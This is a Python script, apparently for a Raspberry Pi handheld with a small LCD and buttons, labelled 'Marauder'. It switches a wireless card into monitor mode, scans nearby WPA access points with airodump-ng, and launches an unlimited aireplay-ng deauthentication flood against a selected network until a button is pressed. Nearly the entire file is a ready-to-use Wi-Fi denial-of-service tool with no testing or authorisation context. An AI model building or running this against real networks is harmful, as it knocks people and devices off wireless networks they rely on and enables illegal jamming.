```python
#!/usr/bin/env python3

import os
import sys
import time
import signal
import subprocess
import re

from PIL import Image, ImageDraw, ImageFont
import RPi.GPIO as GPIO
import LCD_1in44

# ========================
# GLOBAL STATE
# ========================

RUNNING = True
active_process = None

CONTROL_IFACE = None
ATTACK_IFACE = None

PINS = {
    "UP": 6,
    "DOWN": 19,
    "LEFT": 5,
    "RIGHT": 26,
    "PRESS": 13,
    "KEY3": 16
}

DEBOUNCE = 0.2
last_press = 0

# ========================
# LCD SETUP
# ========================

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)

WIDTH, HEIGHT = 128, 128

image = Image.new("RGB", (WIDTH, HEIGHT), "black")
draw = ImageDraw.Draw(image)

font = ImageFont.load_default()

def render():
    LCD.LCD_ShowImage(image, 0, 0)

def clear():
    global image, draw
    image = Image.new("RGB", (WIDTH, HEIGHT), "black")
    draw = ImageDraw.Draw(image)

# ========================
# GPIO
# ========================

GPIO.setmode(GPIO.BCM)
for p in PINS.values():
    GPIO.setup(p, GPIO.IN, pull_up_down=GPIO.PUD_UP)

# ========================
# UTIL
# ========================

def run(cmd):
    return subprocess.getoutput(cmd)

def log(msg):
    print(f"[MARAUDER] {msg}")

# ========================
# PROCESS CONTROL
# ========================

def kill_process():
    global active_process
    if active_process:
        try:
            os.killpg(os.getpgid(active_process.pid), signal.SIGTERM)
        except:
            pass
        active_process = None

# ========================
# INPUT
# ========================

def get_input():
    global last_press

    now = time.time()
    if now - last_press < DEBOUNCE:
        return None

    if GPIO.input(PINS["UP"]) == 0:
        last_press = now
        return "UP"
    if GPIO.input(PINS["DOWN"]) == 0:
        last_press = now
        return "DOWN"
    if GPIO.input(PINS["LEFT"]) == 0:
        last_press = now
        return "BACK"
    if GPIO.input(PINS["PRESS"]) == 0:
        last_press = now
        return "SELECT"
    if GPIO.input(PINS["KEY3"]) == 0:
        cleanup()

    return None

# ========================
# DISPLAY
# ========================

def message(lines):
    clear()
    y = 20
    for line in lines:
        draw.text((5, y), line, fill="white", font=font)
        y += 15
    render()

# ========================
# MENU
# ========================

def menu(title, items):
    index = 0

    while True:
        clear()

        draw.text((5, 5), title, fill="cyan", font=font)

        for i, item in enumerate(items):
            y = 25 + i * 15
            if i == index:
                draw.rectangle((0, y-2, WIDTH, y+12), fill="blue")
                draw.text((5, y), f"> {item}", fill="white")
            else:
                draw.text((10, y), item, fill="white")

        render()

        key = get_input()

        if key == "DOWN":
            index = (index + 1) % len(items)
        elif key == "UP":
            index = (index - 1) % len(items)
        elif key == "SELECT":
            return items[index]
        elif key == "BACK":
            return None

        time.sleep(0.05)

# ========================
# INTERFACE MANAGER
# ========================

def get_interfaces():
    out = run("iwconfig")
    return list(set(re.findall(r'(wlan\d+)', out)))

def detect_roles():
    roles = {}

    for iface in get_interfaces():
        info = run(f"ip addr show {iface}")
        if "inet " in info:
            roles[iface] = "ACTIVE"
        else:
            roles[iface] = "FREE"

    return roles

def select_interface():
    global CONTROL_IFACE

    roles = detect_roles()
    items = []

    for iface, role in roles.items():
        items.append(f"{iface} ({role})")
        if role == "ACTIVE":
            CONTROL_IFACE = iface

    choice = menu("Select Interface", items)
    if not choice:
        return None

    return choice.split()[0]

def confirm_interface(iface):
    if iface == CONTROL_IFACE:
        choice = menu("Break Network?", ["No", "Yes"])
        return choice == "Yes"
    return True

def enable_monitor(iface):
    global ATTACK_IFACE

    message([f"Monitor:", iface])

    if iface != CONTROL_IFACE:
        run("airmon-ng check kill")
    else:
        message(["Keeping network"])
        time.sleep(1)

    run(f"ip link set {iface} down")
    run(f"iwconfig {iface} mode monitor")
    run(f"ip link set {iface} up")

    result = run(f"iwconfig {iface}")

    if "Mode:Monitor" in result:
        ATTACK_IFACE = iface
        return True

    out = run(f"airmon-ng start {iface}")
    match = re.search(r'(\w+mon)', out)

    if match:
        ATTACK_IFACE = match.group(1)
        return True

    return False

def restore_network():
    global ATTACK_IFACE

    if ATTACK_IFACE:
        run(f"airmon-ng stop {ATTACK_IFACE}")
        run("systemctl restart NetworkManager")
        ATTACK_IFACE = None

# ========================
# WIFI FEATURES
# ========================

def scan_aps():
    global active_process

    message(["Scanning APs..."])
    os.system("rm -f /tmp/scan*")

    cmd = ["airodump-ng", "-w", "/tmp/scan", "--output-format", "csv", ATTACK_IFACE]
    active_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)

    time.sleep(6)
    kill_process()

    aps = []
    try:
        with open("/tmp/scan-01.csv", "r", errors="ignore") as f:
            for line in f:
                if "," in line and "WPA" in line:
                    parts = line.split(",")
                    aps.append({
                        "bssid": parts[0].strip(),
                        "channel": parts[3].strip(),
                        "essid": parts[13].strip()
                    })
    except:
        pass

    if not aps:
        message(["No APs found"])
        time.sleep(2)
        return None

    names = [ap["essid"] for ap in aps]
    choice = menu("Select AP", names)

    if not choice:
        return None

    return next(ap for ap in aps if ap["essid"] == choice)

def deauth(ap):
    global active_process

    message(["Deauth...", ap["essid"][:10]])

    cmd = [
        "aireplay-ng",
        "--deauth", "0",
        "-a", ap["bssid"],
        ATTACK_IFACE
    ]

    active_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)

    while True:
        if GPIO.input(PINS["KEY3"]) == 0:
            break
        time.sleep(0.1)

    kill_process()

# ========================
# CLEANUP
# ========================

def cleanup():
    global RUNNING
    RUNNING = False

    kill_process()
    restore_network()

    GPIO.cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# ========================
# MAIN
# ========================

def main():
    iface = select_interface()
    if not iface:
        cleanup()

    if not confirm_interface(iface):
        cleanup()

    if not enable_monitor(iface):
        message(["Monitor failed"])
        time.sleep(2)
        cleanup()

    message([f"Using:", ATTACK_IFACE])
    time.sleep(1)

    while RUNNING:
        choice = menu("Marauder", ["Scan", "Deauth", "Exit"])

        if choice == "Scan":
            scan_aps()

        elif choice == "Deauth":
            ap = scan_aps()
            if ap:
                deauth(ap)

        elif choice == "Exit":
            break

if __name__ == "__main__":
    main()